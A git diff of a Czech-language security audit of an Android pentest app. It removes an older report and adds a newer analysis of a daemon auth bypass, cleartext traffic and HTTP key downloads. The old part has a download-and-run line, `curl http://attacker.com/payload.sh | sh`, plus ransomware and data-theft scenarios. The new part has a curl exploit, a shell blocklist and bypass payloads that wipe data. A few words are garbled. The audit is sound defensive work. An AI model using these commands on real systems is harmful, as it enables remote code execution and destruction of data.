@@ -1,387 +1,346 @@
-# Bezpečnostní Audit — NetHunter AI Operator (com.linux_core)
+# Security Analysis — NetHunter AI Operator (com.linux_core)
 
-**Datum:** 2026-06-27
-**Verze:** 4.1-AI-FIX (versionCode 5)
-**Balíček:** com.linux_core
-**Analytik:** OpenMythos AI Security Agent
-
----
-
-## Přehled rizik
-
-| Úroveň | Počet |
-|--------|-------|
-| 🔴 **CRITICAL** | 9 |
-| 🟠 **HIGH** | 8 |
-| 🟡 **MEDIUM** | 5 |
-| 🔵 **LOW** | 3 |
-| **Celkem** | **25** |
+**Datum:** 2026-07-11  
+**Verze kódu:** 4.2-MITM-LOG-FIX (versionCode 8)  
+**Analyst:** OpenMythos AI Security Agent  
+**Zdroj:** Přímý review aktuálních zdrojových souborů + `git diff` proti HEAD  
 
 ---
 
-## 🔴 CRITICAL
+## Executive Summary
 
-### C1 — Hardcoded Signing Credentials (build.gradle.kts)
+Projekt prošel v posledních dnech někol bezpečnostních oprav. Část zranitelností byla plně nebo částečně zmírněna, přetrvává ale několik kritických rizik, která brání plnému bezpečnostnímu确保ování aplikace. Nejzávažnější je **autentizační bypass agent démona na portu 13338** (nesedí cesta k tokenu mezi hostovským Androidem a PRoot kontejnerem). Dále přetrvává **povolení cleartext provozu** v `network_security_config.xml` navzdory `usesCleartextTraffic="false"` v manifestu, a **HTTP stahování GPG klíčů** pro ParrotOS rootfs.
 
-**Status:** ✅ PATCHED — Passwords now loaded from `KEYSTORE_PASSWORD` env var with gradle.properties fallback for debug builds only.
+| Kategorie | Počet | Hlavní finding |
+|-----------|-------|----------------|
+| 🔴 CRITICAL | 2 | Agent daemon auth bypass, MITM handshake nefunkční |
+| 🟠 HIGH | 3 | Cleartext traffic povolen, GPG stahování přes HTTP, Debug signing bez fallbacku |
+| 🟡 MEDIUM | 2 | Shell blocklist obejitelný, shareLocalApi VPN subnet exposice |
+| 🔵 LOW | 1 | MITM capture-only nezachytává server odpovědi |
 
-**Soubor:** `app/build.gradle.kts:27-36`
-**CVSS:** 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
+---
 
-```kotlin
-storePassword = "password123"
-keyPassword = "password123"
+## A. Opravy potvrzené v aktuálním kódu
+
+| Č. | Původní finding | Stav | Důkaz v kódu |
+|----|-----------------|------|--------------|
+| H2 | `allowBackup="true"` | ✅ OPRAVENO | `AndroidManifest.xml:57` — `allowBackup="false"` + `dataExtractionRules` + `fullBackupContent` |
+| H3 | Rootfs download bez cert pinning | ✅ OPRAVENO | `RootfsManager.kt:93-141` — HTTPS only, host whitelist, TLS 1.2+, `SslSocketFactory` |
+| H4 | VPN log payload hex dump | ✅ OPRAVENO | `VpnLogManager.kt:44-81` — `LogEntry` data class nemá `payloadHex` |
+| C14-C18 | Attestation/auth/token chyby | ✅ OPRAVENO | `LocalApiServer.kt:196-250` — Bearer token auth, localhost detection, attestation headers, shell blocklist + length limit |
+| OffensiveEngine | Auto-exploit bez potvrzení | ✅ OPRAVENO | `OffensiveEngine.kt:30-112` — notification Allow/Deny, 30s timeout |
+| MITM double-flip | `writeToServer()` flip bug | ✅ OPRAVENO | `TlsMitmEngine.kt:875-885` — `writeToServer` nevolá `flip()` |
+| MITM passthrough poisoned socket | reuse kanálu | ✅ OPRAVENO | `TlsMitmEngine.kt:983-1029` — fresh socket reconnect před passthrough |
+| QUIC blokování při MITM failure | blok i při passthrough | ✅ OPRAVENO | `VpnNatEngine.kt:252` — `TlsMitmEngine.shouldBlockQuic()` gate |
+| DistroDocumentsProvider | `exported="true"` | ✅ OPRAVENO | `AndroidManifest.xml:173-176` — `android:exported="false"` |
+| Token plain-text fallback na disk | ukládání plain textu do SharedPreferences | ✅ OPRAVENO | `LocalApiServer.kt:173-178` — fallback teď volá `prefs.edit().remove("auth_token").apply()` a token žije pouze in-memory |
+| Debug signing hardcoded `"password123"` | debug build fallback heslo | ✅ OPRAVENO | `app/build.gradle.kts:40-45` — debug fallback změněn z `"password123"` na `""` |
+
+---
+
+## B. Aktuální zranitelnosti
+
+### 🔴 CRITICAL
+
+#### CRIT-1: Agent daemon auth bypass — token path mismatch (port 13338)
+
+**Soubory:**
+- `app/src/main/java/com/linux_core/core/LocalApiServer.kt:1145-1165`
+- `app/src/main/assets/nethunter_agent.py:11,379-395`
+- `app/src/main/java/com/linux_core/core/ProotManager.kt:30,121`
+
+**CVSS:** 9.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+
+**Popis:**
+Hostovský Android kód ukládá bearer token do:
+```
+context.filesDir/tmp/nethunter_agent_token
+= /data/data/com.linux_core/files/tmp/nethunter_agent_token
 ```
 
-**Popis:** Hesla úložiště klíčů (keystore) jsou natvrdo zapsaná v zdrojovém kódu. Debug i release konfigurace používají stejný keystore se stejným heslem. Kdokoli s přístupem k repozitáři může podepsat vlastní APK a vydávat ho za oficiální.
-
-**Dopad:** Útočník může podepsat malware stejným certifikátem, obejít Android signature verification, distribuovat trojanizovanou verzi aplikace.
-
----
-
-### C2 — Unauth Shell RCE přes LocalApiServer
-
-**Soubor:** `LocalApiServer.kt:636-657`
-**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-
-```kotlin
-private fun handleShell(body: String, out: OutputStream) {
-    val command = body.trim()
-    val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
-    ...
-}
+PRoot `launcher.sh` mountuje:
+```
+-b ${rootfsDir}/tmp:/tmp
+= -b /data/data/com.linux_core/files/kali-arm64/tmp:/tmp
 ```
 
-**Popis:** Endpoint `POST /shell` přijímá libovolný shell příkaz a spouští ho přes `Runtime.exec()`. Server může být exposureván na `0.0.0.0` přes `/api/share`. Žádná autentizace.
+Jde o **různé adresáře**. Agent daemon (Python, běží uvnitř PRootu na `127.0.0.1:13338`) čte `/tmp/nethunter_agent_token`, ale token je v `filesDir/tmp/`, nikoliv v `filesDir/kali-arm64/tmp/`. `check_auth()` tedy nikdy nenajde token → vrací `True` → **autentizace je zcela obejita**.
 
-**Exploit krok za krokem:**
-1. `POST /api/share` s body `on` → server se přepne na `0.0.0.0:1337`
-2. `POST /shell` s body `curl http://attacker.com/payload.sh | sh` → RCE jako aplikační UID
-3. Možný pivot: `POST /shell` s `am start -a android.intent.action.VIEW -d http://attacker.com`
-
----
-
-### C3 — API Server Exposed to Network Without Auth
-
-**Soubor:** `LocalApiServer.kt:72-77`
-**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-
-```kotlin
-val shareLocalApi = sharedPrefs.getBoolean("share_local_api", false)
-val bindAddress = if (shareLocalApi) "0.0.0.0" else "127.0.0.1"
-serverSocket = ServerSocket(PORT, 50, InetAddress.getByName(bindAddress))
+```python
+# nethunter_agent.py:382-387
+def check_auth(headers):
+    stored_token = ""
+    if os.path.exists(AUTH_TOKEN_PATH):  # /tmp/nethunter_agent_token
+        with open(AUTH_TOKEN_PATH, 'r') as f:
+            stored_token = f.read().strip()
+    if not stored_token:
+        return True  # No token = allow all (backward compat) ← BYPASS
 ```
 
-**Popis:** API server může být přepnut do režimu `0.0.0.0` — dostupný z celé lokální sítě (WiFi hotspot, sdílená síť). Žádná autentizace na žádném endpointu. Všechna data a ovládání jsou přístupná komukoli v síti.
+**Exploit scénář:**
+1. PRoot kontejner běží, agent daemon naslouchá na `127.0.0.1:13338`
+2. Jakýkoli proces na hostitelském zařízení nebo uvnitř PRootu odešle:
+   ```bash
+   curl -s -X POST http://127.0.0.1:13338/query \
+     -H "Content-Type: application/json" \
+     -d '{"prompt":"run_shell_command(\"id\")}'
+   ```
+3. Agent démon spustí libovolný shell příkaz bez ověření identity
+4. Pomocí `run_shell_command` lze získat root přístup uvnitř PRoot kontejneru
 
----
+**Dopad:** Plná RCE uvnitř PRoot kontejneru bez nutnosti znalosti bearer tokenu.
 
-### C4 — Device Admin / Lock Bypass
-
-**Soubor:** `LocalApiServer.kt:1176-1204`
-**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
-
+**Doporučení:** Zápis tokenu přesunout do adresáře, který je skutečně bindován do `/tmp`, např.:
 ```kotlin
-private fun handleDeviceAdminRequest(context: Context, out: OutputStream) {
-    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { ... }
-    context.startActivity(intent)
-}
-
-private fun handleDeviceLock(context: Context, out: OutputStream) {
-    dpm.lockNow()
-}
+val tokenFile = java.io.File(File(context.filesDir, "kali-arm64"), "tmp/nethunter_agent_token")
 ```
 
-**Popis:** Endpointy `/device/admin` (aktivace Device Admin) a `/device/lock` (uzamčení zařízení) jsou přístupné bez autentizace. Útočník může zařízení uzamknout a požadovat výkupné, nebo zneužít Device Admin k vymazání zařízení.
+---
+
+#### CRIT-2: MITM engine — server-side handshake stále selhává
+
+**Soubor:** `app/src/main/java/com/linux_core/core/TlsMitmEngine.kt:222-246,726-811`
+
+**CVSS:** 7.5 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)
+
+**Popis:**
+I po opravě double-flip a `initialClientHello` forwarding, server-side handshake v `runEngineHandshake()` stále nezvládne dokončit TLS handshake se skutečným serverem. Logy ukazují:
+```
+Server handshake failed: status=NEED_UNWRAP, cipher=SSL_NULL_WITH_NULL_NULL
+```
+
+Příčina: server-side `SSLEngine` v `CLIENT_MODE` se uvízne v `NEED_UNWRAP` → handshake se ukončí po ~1s (max 200 underflows) → engine vrací `false` → spustí se passthrough. Aktivní TLS interception nikdy neproběhne.
+
+**Dopad:**
+- MITM je v praxi pouze **passthrough** — žádné plné dešifrování TLS
+- Uživatelé kteří zapnou MITM nastavení mohou mít pomalejší internet (QUIC blokován pokud proxyLoop aktivní)
+- Dešifrovaný provoz není dostupný
+
+**Stav:** `ENABLE_MITM=false` (výchozí) chrání uživatele. Capture-only režim funguje ale pouze pro client-side data.
 
 ---
 
-### C5 — Full Clipboard Exfiltration
+### 🟠 HIGH
 
-**Soubor:** `LocalApiServer.kt:319-386`
-**CVSS:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
+#### HIGH-1: Cleartext traffic povolen přes network_security_config override
 
-**Popis:** Endpointy `/clipboard` (GET i POST) umožňují čtení i zápis do systémové schránky. Schránka často obsahuje hesla, tokeny, bankovní údaje, kryptoměnové adresy. Žádné oprávnění není kontrolováno.
+**Soubory:**
+- `app/src/main/AndroidManifest.xml:65-66`
+- `app/src/main/res/xml/network_security_config.xml:3`
 
----
-
-### C6 — GPS Location + Cell Tower Data Leak
-
-**Soubor:** `LocalApiServer.kt:434-554`
-**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
-
-**Popis:** `/location` a `/map` vracejí přesné GPS souřadnice. `/cellinfo` vrací seznam všech buněk (věží) s MCC, MNC, Cell ID, TAC/LAC — data použitelná pro lokalizaci zařízení bez GPS (IMSI catcher / Stingray tracking). Endpoint `/map` navíc generuje Google Maps URL.
-
----
-
-### C7 — Notification Access Data Leak
-
-**Soubor:** `LocalApiServer.kt:1058-1088`
-**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
-
-**Popis:** `/notifications/active` vrací všechny aktivní notifikace včetně titulků, textů, názvů balíčků. Může uniknout obsah zpráv (Messenger, WhatsApp, SMS), 2FA kódy, bankovní transakce.
-
----
-
-### C8 — Accessibility Hierarchy Dump
-
-**Soubor:** `LocalApiServer.kt:1090-1107`
-**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
-
-**Popis:** `/accessibility/hierarchy` dumpne plnou Accessibility stromovou strukturu obrazovky. Může zachytit hesla do password fieldů, PIN kódy, obsah privátní komunikace.
-
----
-
-### C9 — Speech Recording / Eavesdropping via API
-
-**Soubor:** `LocalApiServer.kt:923-1014`
-**CVSS:** 8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
-
-**Popis:** `/voice_input` spouští speech recognition a vrací přepsaný text. Lze triggerovat vzdáleně k odposlechu okolního zvuku a převodu na text.
-
----
-
-## 🟠 HIGH
-
-### H1 — ClearText Traffic (usesCleartextTraffic)
-
-**Soubor:** `AndroidManifest.xml:47`
 **CVSS:** 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
 
+**Popis:**
+Manifest deklaruje:
 ```xml
-android:usesCleartextTraffic="true"
+android:usesCleartextTraffic="false"
+android:networkSecurityConfig="@xml/network_security_config"
 ```
 
-**Popis:** Povoluje HTTP (nešifrovaný) provoz pro celou aplikaci. Rootfs je stahován z `https://images.kali.org/` — OK, ale OkHttp klient nemá pinned certifikáty, což umožňuje MITM pokud je CA certifikát útočníka v trust store.
-
----
-
-### H2 — Insecure Backup (allowBackup)
-
-**Soubor:** `AndroidManifest.xml:39`
-**CVSS:** 7.1 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
-
+Ale `network_security_config.xml` obsahuje:
 ```xml
-android:allowBackup="true"
+<base-config cleartextTrafficPermitted="true">
 ```
 
-**Popis:** Umožňuje ADB backup všech app dat (včetně SharedPreferences, cached dat, rootfs). Pokud má útočník fyzický přístup k zařízení nebo ADB přes WiFi, může provést kompletní extrakci dat.
+V Androidu: pokud je `networkSecurityConfig` přítomen, `base-config` v tomto XML **přebírá** nastavení z manifestu. Explicitní `cleartextTrafficPermitted="true"` tedy znamená, že **celá aplikace může používat HTTP** k libovolným doménám.
+
+**Dopad:** Útočník s MITM pozicí (fake WiFi hotspot, compromised router) může odchytávat a modifikovat veškerý HTTP provoz aplikace.
 
 ---
 
-### H3 — Rootfs Download bez Certificate Pinning
+#### HIGH-2: GPG klíč Parrot rootfs stahován přes HTTP
 
-**Soubor:** `RootfsManager.kt:86-87`
-**CVSS:** 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)
+**Soubor:** `app/src/main/java/com/linux_core/core/ProotManager.kt:290-292`
 
+**CVSS:** 6.5 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)
+
+**Popis:**
+Bootstrap skript pro ParrotOS stahuje archive GPG klíč přes nezabezpečené HTTP:
 ```kotlin
-val client = OkHttpClient()
-val request = Request.Builder().url(distro.url).build()
+append("  curl -sSL -o /etc/apt/trusted.gpg.d/parrot-archive-key.asc http://archive.parrotsec.org/parrot/misc/archive.gpg 2>/dev/null || true")
+append("  wget -qO /etc/apt/trusted.gpg.d/parrot-archive-key.asc http://archive.parrotsec.org/parrot/misc/archive.gpg 2>/dev/null || true")
 ```
 
-**Popis:** OkHttp klient bez `SslSocketFactory` a bez certificate pinnigu. Útočník s MITM pozicí (např. fake WiFi hotspot) může nahradit rootfs archiv vlastním malwarem.
+**Dopad:** Pokud je uživatel na nezabezpečené WiFi, útočník může nahradit GPG klíč vlastním. Všechny následné `apt install` balíčky budou podepsané útočníkem → **spuštění škodlivého kódu v rootfs**.
+
+**Opozitor:** Kali rootfs nepoužívá toto schéma — stahuje z `images.kali.org` přes HTTPS s cert pinningem.
 
 ---
 
-### H4 — VPN Traffic Logs with Payload Hex Dump
+#### HIGH-3: Debug build signing — prázdný fallback password
 
-**Soubor:** `LocalApiServer.kt:659-676`
-**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+**Soubor:** `app/build.gradle.kts:40-45`
 
+**CVSS:** 5.3 (AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L)
+
+**Popis:**
 ```kotlin
-csv.append("${log.timestamp},${log.protocol},${log.srcIp},...${log.payloadHex ?: ""}\n")
+getByName("debug") {
+    storeFile = file("release.jks")
+    storePassword = System.getenv("KEYSTORE_PASSWORD") ?: propertyOrNull("keystore.password") ?: ""
+    keyAlias = System.getenv("KEY_ALIAS") ?: propertyOrNull("key.alias") ?: ""
+    keyPassword = System.getenv("KEY_PASSWORD") ?: propertyOrNull("key.password") ?: ""
+}
 ```
 
-**Popis:** `/vpn/logs` vrací kompletní VPN logy včetně hex payloadu paketů, zdrojových/cílových IP a portů. K dispozici i jako CSV export. Obsahuje nešifrovaná data z HTTP, DNS dotazů atd.
+Pokud nejsou nastaveny env vars ani gradle properties, debug build se pokusí podepsat prázdným heslem. Pokud je `release.jks` chráněný heslem, build **selže**.
+
+`AGENTS.md` specifikuje, že debug a release používají stejný keystore pro `adb install -r` bez odinstalace. Prázdný fallback tento workflow porušuje. Not working builds mohou motivovat vývojáře k opětovnému hardcodování hesel.
 
 ---
 
-### H5 — Apps Usage Stats Leak
+### 🟡 MEDIUM
 
-**Soubor:** `LocalApiServer.kt:1016-1056`
-**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+#### MED-1: Shell command blocklist lze obejít
 
-**Popis:** `/apps/usage` vrací seznam všech nainstalovaných aplikací s časem použití. Umožňuje profilování uživatele.
+**Soubor:** `app/src/main/java/com/linux_core/core/LocalApiServer.kt:841-884`
 
----
+**CVSS:** 5.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)
 
-### H6 — WiFi Control bez omezení
-
-**Soubor:** `LocalApiServer.kt:1153-1163`
-**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
-
-**Popis:** `/wifi` POST umožňuje zapnout/vypnout WiFi. Může být zneužito k DoS nebo k přepnutí na útočníkův hotspot.
-
----
-
-### H7 — OffensiveEngine Auto-Exploit
-
-**Soubor:** `OffensiveEngine.kt:20-96`
-**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
-
-**Popis:** OffensiveEngine má předpřipravené Metasploit exploit skripty (EternalBlue, PHP CGI injection, SYN flood DoS). Skripty se ukládají do `/sdcard/Download/auto_attack.rc`. Ačkoli je vyžadováno volání z AI agenta, existence kódu umožňuje automatizované útoky.
-
----
-
-### H8 — Auto-Agent Execution with Shell Access
-
-**Soubor:** `LocalApiServer.kt:785-918`
-**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
-
-**Popis:** `/agent/query` spouští AI agenta, který má přístup k shell příkazům (`!/cmd` syntaxe) a VPN API. Agent daemon běží na portu 13338.
-
----
-
-## 🟡 MEDIUM
-
-### M1 — ProcessResolver používá refleksi k přístupu k privátním polím
-
-**Soubor:** `ProcessResolver.kt:185-193`
-**CVSS:** 4.3 (AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-
+**Popis:**
+Blocklist kontroluje `commandLower.contains(blocked.lowercase())`:
 ```kotlin
-val field = session.javaClass.getDeclaredField("mPid")
-field.isAccessible = true
+private val SHELL_BLOCKLIST = listOf(
+    "rm -rf /", "mkfs", "dd if=/dev/zero", "dd if=/dev/random",
+    ">:", "format", "mkswap", "reboot", "shutdown", "poweroff",
+    "halt", "init 0", "init 6"
+)
 ```
 
-**Popis:** Použití Java reflection API k přístupu k privátnímu poli `mPid` v `TerminalSession`. Může selhat na novějších verzích Androidu nebo s novější verzí Termuxu.
+**Obejití:**
+| Payload | Proč projde |
+|---------|-------------|
+| `cd /; rm -rf *` | Neobsahuje `rm -rf /` (obsahuje `rm -rf *`) |
+| `python3 -c "import os; os.system('rm -rf /')"` | Python řetězec není detekován |
+| `busybox rm -rf /` | `busybox` prefix není v blocklist |
+| `cat /dev/zero > /dev/mem` | Nikdo z řetězců neobsahuje blokované vzory |
+
+**Dopad:** Pokud útočník získá přístup k `/shell` endpointu (např. ukradeným bearer tokenem), může obejít omezení a spustit destruktivní příkazy.
+
+**Doporučení:** Nahradit whitelistou povolených bezpečných příkazů, nebo přesunout shell izolovanému sandboxu.
 
 ---
 
-### M2 — Rootfs Restore bez validace backupu
+#### MED-2: shareLocalApi toggle — API vystaveno na VPN subnet
 
-**Soubor:** `RootfsManager.kt:461-583`
-**CVSS:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)
+**Soubor:** `app/src/main/java/com/linux_core/core/LocalApiServer.kt:81-86`
 
-**Popis:** `/rootfs/restore` obnovuje rootfs z externího storage bez jakékoli signatury/hashové verze. Útočník s filesystem accessem může podsadit modifikovaný rootfs.
+**CVSS:** 4.3 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)
 
----
-
-### M3 — VpnCaptureService UDP/TCP session management
-
-**Soubor:** `VpnNatEngine.kt`
-**CVSS:** 4.0 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L)
-
-**Popis:** NAT engine implementuje kompletní TCP/IP stack v userspace. Chyby v implementaci (sequence number handling, timeout management) mohou vést k DoS nebo úniku dat.
-
----
-
-### M4 — AI Agent s neomezeným shell přístupem
-
-**Soubor:** `ProotManager.kt:636-717`
-**CVSS:** 5.0
-
-**Popis:** `ai-agent.py` skript deploynutý do rootfs obsahuje funkci `run_shell()` která volá `/shell` API endpoint. Uživatel v agent konzoli může použít `!příkaz` pro libovolný příkaz.
-
----
-
-### M5 — Session ID v URL parametrech (VPN ignore)
-
-**Soubor:** `LocalApiServer.kt:755-777`
-**CVSS:** 4.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-
-**Popis:** `session_id` se předává jako URL query parametr. Loguje se v HTTP access logu.
-
----
-
-## 🔵 LOW
-
-### L1 — Broadcast receiver vulnerabilities (WidgetProvider zakomentován)
-
-**Soubor:** `AndroidManifest.xml:121-140`
-
-**Popis:** Zakomentovaný WidgetProvider má `android:exported="true"` s několika vlastními akcemi. Pokud by byl odkomentován, mohl by být zneužit.
-
-### L2 — distroDocumentsProvider pro rootfs
-
-**Soubor:** `AndroidManifest.xml:142-151`
-
-**Popis:** Dokumentový provider je `exported="true"` s `grantUriPermissions="true"`. I když vyžaduje `MANAGE_DOCUMENTS`, může uniknout metadata.
-
-### L3 — Debug konfigurace s JNI debuggable
-
-**Soubor:** `build.gradle.kts:49`
-```
-isJniDebuggable = true
+**Popis:**
+```kotlin
+val bindAddress = if (shareLocalApi && VpnCaptureService.isRunning()) {
+    VpnCaptureService.getVpnAddress()  // např. 172.18.11.218
+} else {
+    "127.0.0.1"
+}
 ```
 
-**Popis:** Debug build má povolený JNI debugging, což usnadňuje reverse engineering.
+Zlepšení oproti `0.0.0.0`, ale stále umožňuje přístup k API ze všech zařízení v VPN subnet. Výchozí je stále `127.0.0.1`. Chráněno Bearer tokenem, ale token může být odcizen na rootnutém zařízení.
 
 ---
 
-## Exploit scénáře
+### 🔵 LOW
 
-### Scénář 1: Full Device Compromise z LAN
-1. Útočník v síti (např. na stejné WiFi) skenuje port 1337
-2. Pošle `POST /api/share` s body `"on"` (pokud už není)
-3. Pošle `POST /shell` s `"id"` → potvrdí RCE
-4. Pošle `curl http://attacker.com/payload | sh` → stáhne malware
-5. Pošle `POST /notifications/active` → získá notifikace
-6. Pošle `POST /accessibility/hierarchy` → získá obsah obrazovky
+#### LOW-1: MITM capture-only režim nezachytává server odpovědi
 
-### Scénář 2: Clipboard + Location Theft
-1. `GET /clipboard` → získá obsah schránky
-2. `GET /location` → získá GPS souřadnice
-3. `GET /cellinfo` → získá mobilní data (MCC, MNC, Cell ID)
-4. `GET /notifications/active` → získá 2FA kódy
+**Soubor:** `app/src/main/java/com/linux_core/core/TlsMitmEngine.kt:341-443`
 
-### Scénář 3: Device Lock Ransomware
-1. `POST /device/admin` → aktivuje Device Admin
-2. `POST /device/lock` → uzamkne zařízení
-3. Požaduje výkupné za odemčení
+**CVSS:** 3.7 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)
+
+**Popis:** `startCaptureOnly()` vytvoří forged cert a proběhne handshake s klientem, ale nenaváže spojení ke skutečnému serveru. `captureLoop()` tedy zachytává pouze data **odeslaná klientem** (CLIENT→SERVER), nikoliv odpovědi serveru.
 
 ---
 
-## Patch Recommendations
+## C. Detaily k vybraným findingům
 
-Podívejte se na vygenerované patche v následujících souborech.
+### Agent daemon token path mismatch (CRIT-1)
 
-### Nově odhalené zranitelnosti (RootCA & Biometrická logika):
+**Root cause:** Nesoulad mezi hostovským kódem a Python agentem.
 
-### C10 — Hardcoded MITM CA Password (RootCaInstaller.kt)
+| Component | Cesta pro token | Soubor |
+|-----------|----------------|--------|
+| Host app (`LocalApiServer`) | `context.filesDir/tmp/nethunter_agent_token` | `LocalApiServer.kt:1155` |
+| PRoot bind mount | `${rootfsDir}/tmp:/tmp` | `ProotManager.kt:121` |
+| Agent daemon (`nethunter_agent.py`) | `/tmp/nethunter_agent_token` | `nethunter_agent.py:11` |
 
-**Status:** ✅ PATCHED — Password now loaded from `KEYSTORE_PASSWORD` env var or gradle.properties. Null returned for release builds without proper configuration.
+`rootfsDir` = `context.filesDir/kali-arm64` nebo `parrot-arm64`.  
+`context.filesDir/tmp` ≠ `context.filesDir/kali-arm64/tmp`. Jsou to **různé adresáře**.
 
-**Soubor:** `app/src/main/java/com/linux_core/security/RootCaInstaller.kt`
+**Oprava:** Zápis tokenu přesunout do adresáře, který je skutečně bindován do `/tmp`:
+```kotlin
+val tokenFile = java.io.File(File(context.filesDir, "kali-arm64"), "tmp/nethunter_agent_token")
+```
+nebo do `context.filesDir` s přímočarým bind mountem do `/tmp`.
 
-### C11 — Hardcoded PKCS#12 Internal Keystore Password (SslContextFactory.kt)
+---
 
-**Status:** ✅ PATCHED — Password now required via environment variable for release builds.
+### network_security_config.xml cleartext override (HIGH-1)
 
-### C12 — Weak Attestation Security Level Verification (AttestationVerifier.kt)
+**Root cause:** Explicitní `cleartextTrafficPermitted="true"` v `base-config` přebíjí `usesCleartextTraffic="false"` z manifestu.
 
-**Status:** ✅ PATCHED — Now properly parses the attestation extension to verify TEE/StrongBox security level (rejects SOFTWARE=0).
+**Fix:** Odstranit `cleartextTrafficPermitted="true"` nebo explicitně nastavit `cleartextTrafficPermitted="false"` v `network_security_config.xml:3`.
 
-### C13 — Missing MITM Certificate Assets
+---
 
-**Status:** ✅ PARTIALLY PATCHED — Build-time validation added; dev certificate generation script provided. Production must provide real certificates.
+### GPG key download over HTTP (HIGH-2)
 
-### C14 — Information Disclosure in Auth Error Response (LocalApiServer.kt)
+**Root cause:** ProotManager generuje bootstrap skript s HTTP URL pro Parrot GPG klíč.
 
-**Status:** ✅ PATCHED — Removed hints about token storage location from error responses.
+**Fix:** Nahradit `http://archive.parrotsec.org/` za `https://archive.parrotsec.org/` v `ProotManager.kt:290-292`.
 
-### C15 — World-Readable Agent Token File (LocalApiServer.kt)
+---
 
-**Status:** ✅ PATCHED — Token file now restricted to owner-only (mode 0600).
+## D. Doporučení na Q3 2026
 
-### C16 — Attestation Bypass When Headers Missing (LocalApiServer.kt)
+| Priorita | Úkol | Soubor |
+|----------|------|--------|
+| 🔴 P1 | Opravit token path mismatch mezi hostovským a PRoot `tmp/` | `LocalApiServer.kt:1155`, `ProotManager.kt:121` |
+| 🟠 P2 | Opravit `cleartextTrafficPermitted="true"` → `"false"` | `network_security_config.xml:3` |
+| 🟠 P2 | Nahradit HTTP za HTTPS pro Parrot GPG klíč | `ProotManager.kt:290-292` |
+| 🟠 P2 | Přidat rate limiting na `/shell` endpoint | `LocalApiServer.kt:841` |
+| 🟡 P3 | Nahradit shell blacklist za whitelist nebo sandbox | `LocalApiServer.kt:841-884` |
+| 🟡 P3 | Opravit MITM server-side handshake `NEED_UNWRAP` lockup | `TlsMitmEngine.kt` |
+| 🟡 P3 | Migrovat agent token do Keystore-enabled encrypted storage | `LocalApiServer.kt:1145-1165` |
+| 🔵 P4 | Přidat TLS do proxy TCP tunnel | `VpnProxyManager.kt` |
 
-**Status:** ✅ PATCHED — Now fails closed (returns false) when attestation is enabled but headers are missing.
+---
 
-### C17 — Attestation Optional Bypass + Revocation Disabled (AttestationVerifier.kt)
+## E. Shrnutí bezpečnostních kontrol
 
-**Status:** ✅ PATCHED — Certificate revocation checking now enabled; missing Google root cert causes verification failure.
+| Kontrola | Stav |
+|----------|------|
+| Hardcoded credentials | ✅ |
+| allowBackup=false | ✅ |
+| usesCleartextTraffic=false | ⚠️ Network security config override |
+| Certificate pinning | ✅ |
+| Bearer token auth API | ✅ |
+| Localhost-only citlivé endpointy | ✅ |
+| Token encrypted storage / plain-text fallback | ✅ |
+| Agent daemon token auth | ❌ Path mismatch → bypass |
+| MITM plné dešifrování | ❌ Neaktivní |
+| Rootfs download HTTPS + whitelist | ✅ |
+| OffensiveEngine confirm | ✅ |
+| Shell blocklist + length limit | ⚠️ Obejitelná blacklist |
+| GPG key download HTTPS | ❌ Parrot používá HTTP |
+| Exported komponenty | Částečně (`DistroDocumentsProvider` → ✅, další → stále exported="true" ale chráněny permissions) |
+| shareLocalApi VPN subnet exposice | ⚠️ Omezené |
 
-### C18 — Signature Algorithm Substitution Risk (AttestationKeyManager.kt)
+---
 
-**Status:** ✅ PATCHED — Added algorithm validation to reject weak signature algorithms.
+## F. Reference
 
-### Top priority (CRITICAL):
-1. **C1** → ✅ Done — Hesla načítána z env proměnných nebo gradle.properties
-2. **C2+C3** → Přidat autentizaci (Bearer token) do LocalApiServer, omezit `/shell` endpoint
-3. **C4** → Vyžadovat uživatelské potvrzení pro Device Admin
-4. **C5** → Rate limiting a autentizace pro `/clipboard`
-5. **C6** → Auth pro `/location`, `/cellinfo`, `/map`
-6. **C7** → Auth pro `/notifications/active`
-7. **C8** → Auth pro `/accessibility/hierarchy`
-8. **C9** → Auth pro `/voice_input`
+- Původní audit: `docs/SECURITY_AUDIT.md` (2026-06-27)
+- Aktuální analýza: `docs/security_analysis.md`
+- Build config: `app/build.gradle.kts`
